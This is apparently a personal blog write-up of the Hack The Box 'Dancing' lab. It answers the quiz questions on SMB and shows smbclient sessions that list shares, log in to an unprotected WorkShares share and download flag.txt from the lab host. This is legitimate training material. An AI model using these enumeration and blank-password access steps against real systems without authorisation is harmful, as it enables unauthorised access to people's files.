---
title: Dancing
date: 2025-04-5 00:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, dancing, smb, smbclient]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ce52eadd09ff5a28a1eea8c65d6683a9.png
    alt: Hack The Box
---
Esta vez HTB nos trae un reto realcionado con Windows, la primera tarea nos da una pista de lo que toca **Samba**

## Dancing
## Task 1

What does the 3-letter acronym SMB stand for?
>Server Message Block

## Task 2

What port does SMB use to operate at?
>445

## Task 3

What is the service name for port 445 that came up in our Nmap scan?
>microsoft-ds

## Task 4

What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
> -L

┌─[eu-starting-point-1-dhcp]─[10.10.15.134]─[pmartinezr@htb-n8eht2kbq2]─[~]
└──╼ [★]$ smbclient -L //10.129.133.62
Password for [WORKGROUP\pmartinezr]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.133.62 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


## Task 5

How many shares are there on Dancing?
>4

## Task 6

What is the name of the share we are able to access in the end with a blank password?
>WorkShares

```shell
┌─[eu-starting-point-1-dhcp]─[10.10.15.134]─[pmartinezr@htb-n8eht2kbq2]─[~]
└──╼ [★]$ smbclient //10.129.133.62/WorkShares/ -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1752921 blocks available
smb: \> 
```


## Task 7

What is the command we can use within the SMB shell to download the files we find?

``` shell
┌─[eu-starting-point-1-dhcp]─[10.10.15.134]─[pmartinezr@htb-n8eht2kbq2]─[~]
└──╼ [★]$ smbclient //10.129.133.62/WorkShares/ -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1752921 blocks available
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 04:08:24 2021
  ..                                  D        0  Mon Mar 29 04:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 06:00:37 2021

		5114111 blocks of size 4096. 1752918 blocks available
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 04:26:57 2021

		5114111 blocks of size 4096. 1752918 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\> quit
┌─[eu-starting-point-1-dhcp]─[10.10.15.134]─[pmartinezr@htb-n8eht2kbq2]─[~]
└──╼ [★]$ cat flag.txt 
```

## Submit Flag 

## Submit root flag [achievement](https://www.hackthebox.com/achievement/machine/2336390/395)